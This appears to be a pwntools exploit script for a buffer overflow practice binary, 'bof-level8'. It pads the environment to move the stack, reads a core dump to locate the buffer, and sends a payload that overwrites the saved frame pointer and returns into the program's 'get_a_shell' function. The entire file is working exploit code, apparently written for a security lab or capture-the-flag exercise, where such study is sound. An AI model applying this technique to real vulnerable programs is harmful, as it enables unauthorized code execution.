#!/usr/bin/env python

from pwn import *
import os

env = {
        'ENVENVENV' : 'a'*200,  # change this number to control your stack...
}                               # i.e., if your buffer is at 0x7fffffff??80,
                                # your attack will never work. change that 200
                                # to other value will change 0x7fffffff??80 to
                                # e.g., 0x7fffffff??60 or other lower values,
                                # then your attack might work..


p = process('./bof-level8', env=env)

# sample buffer
buf = "A" * 0x80 + "\x00"

# generate core
if not os.path.exists('core'):
    p.sendline(buf)
    p.wait()


c = Core('./core')

# example: 0x7fffffffebf0 was the buffer address
buffer_addr = c.stack.find(buf)
print(hex(buffer_addr))

e = ELF('./bof-level8')

addr_of_get_a_shell = e.symbols['get_a_shell']

# compose buffer like this... (buffer_addr + 16) == saved_ebp
# -> 0x7fffffffebf0 + 0x10 = 0x7fffffffec00; last byte: 0x00
buf = "A" * 16 + "BBBBBBBB" + p64(addr_of_get_a_shell)

# change \x00 depending on the buffer address..
buf = buf + "C" * (0x80 - len(buf))  + "\x00"

p.sendline(buf)

p.interactive()